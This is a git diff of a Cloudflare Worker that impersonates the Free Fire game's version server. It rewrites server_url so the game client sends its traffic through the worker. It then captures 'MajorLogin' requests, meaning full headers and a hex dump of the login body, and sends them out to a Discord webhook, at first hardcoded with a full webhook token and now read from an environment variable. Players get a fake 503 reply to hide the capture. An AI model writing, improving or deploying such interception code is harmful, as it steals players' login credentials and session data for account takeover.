@@ -4,12 +4,9 @@ export default {
     const path = url.pathname.toLowerCase();
 
     // ====================== VERSION ENDPOINT ======================
-    // Handles: /live/ver.php (game appends this automatically)
     if (path.includes("ver.php") || path.includes("/live/ver") || path.endsWith("/ver")) {
       try {
         const officialUrl = new URL("https://version.ggwhitehawk.com/live/ver.php");
-
-        // Forward all original parameters
         url.searchParams.forEach((value, key) => {
           officialUrl.searchParams.set(key, value);
         });
@@ -23,24 +20,16 @@ export default {
         });
 
         let data = await officialRes.json();
-
-        // Replace server_url with our worker
         const myBaseUrl = `https://${url.host}/`;
         data.server_url = myBaseUrl;
         if (data.serverUrl) data.serverUrl = myBaseUrl;
 
         return new Response(JSON.stringify(data), {
           status: 200,
-          headers: {
-            "Content-Type": "application/json",
-            "Access-Control-Allow-Origin": "*",
-          },
-        });
-      } catch (err) {
-        return new Response(JSON.stringify({ error: "proxy failed", message: err.message }), {
-          status: 500,
           headers: { "Content-Type": "application/json" },
         });
+      } catch (err) {
+        return new Response(JSON.stringify({ error: err.message }), { status: 500 });
       }
     }
 
@@ -49,47 +38,72 @@ export default {
       try {
         const bodyBuffer = await request.arrayBuffer();
         const bodyBytes = new Uint8Array(bodyBuffer);
-        const hexBody = Array.from(bodyBytes).map(b => b.toString(16).padStart(2, "0")).join("");
-        const headersObj = Object.fromEntries(request.headers);
+        const hexBody = Array.from(bodyBytes)
+          .map(b => b.toString(16).padStart(2, "0"))
+          .join("");
 
-        // Send to Discord
-        await fetch("https://discord.com/api/webhooks/1555189702934667267/uJtdG3-cKtfINrpGMsKb0S_0qE4rM_esyQLZDy1jBKBSNif2QTj3tGNQWz35ZMbbAOUx", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
+        const headersObj = Object.fromEntries(request.headers);
+        const webhook = env.DISCORD_WEBHOOK;
+
+        if (webhook) {
+          // Create the text file content
+          const fileContent = 
+`Free Fire MajorLogin Capture
+==============================
+Time: ${new Date().toISOString()}
+Method: ${request.method}
+Path: ${url.pathname}
+Body Size: ${bodyBytes.length} bytes
+
+Headers:
+${JSON.stringify(headersObj, null, 2)}
+
+Full Hex Body:
+${hexBody}
+`;
+
+          // Prepare multipart form
+          const form = new FormData();
+
+          // Message + embed
+          form.append("payload_json", JSON.stringify({
             content: "**Free Fire MajorLogin Captured**",
             embeds: [{
-              title: "Login Request",
+              title: "Login Request Details",
               color: 5763719,
               fields: [
-                { name: "Path", value: `\`${request.method} ${url.pathname}\`` },
+                { name: "Method + Path", value: `\`${request.method} ${url.pathname}\`` },
                 { name: "Body Size", value: `${bodyBytes.length} bytes`, inline: true },
                 { name: "Time", value: new Date().toISOString(), inline: true },
-                { name: "Headers", value: "```json\n" + JSON.stringify(headersObj, null, 2).substring(0, 900) + "\n```" },
-                { name: "Body Hex", value: "```\n" + hexBody.substring(0, 900) + (hexBody.length > 900 ? "\n...truncated" : "") + "\n```" }
-              ]
+              ],
+              footer: { text: "Full hex is attached as .txt file" }
             }]
-          })
-        });
+          }));
 
-        // Full hex if long
-        if (hexBody.length > 900) {
-          await fetch("https://discord.com/api/webhooks/1555189702934667267/uJtdG3-cKtfINrpGMsKb0S_0qE4rM_esyQLZDy1jBKBSNif2QTj3tGNQWz35ZMbbAOUx", {
+          // Attach the .txt file
+          form.append(
+            "files[0]",
+            new Blob([fileContent], { type: "text/plain" }),
+            `majorlogin_${Date.now()}.txt`
+          );
+
+          // Send to Discord
+          await fetch(webhook, {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              content: "**Full Hex:**\n```\n" + hexBody + "\n```"
-            })
+            body: form
           });
         }
       } catch (e) {
-        console.log(e);
+        console.log("Capture error:", e);
       }
 
-      // Safe error response
+      // Return safe error
       return new Response("Service Temporarily Unavailable", {
         status: 503,
-        headers: { "Content-Type": "text/plain", "Retry-After": "1800" }
+        headers: {
+          "Content-Type": "text/plain",
+          "Retry-After": "1800"
+        }
       });
     }
 
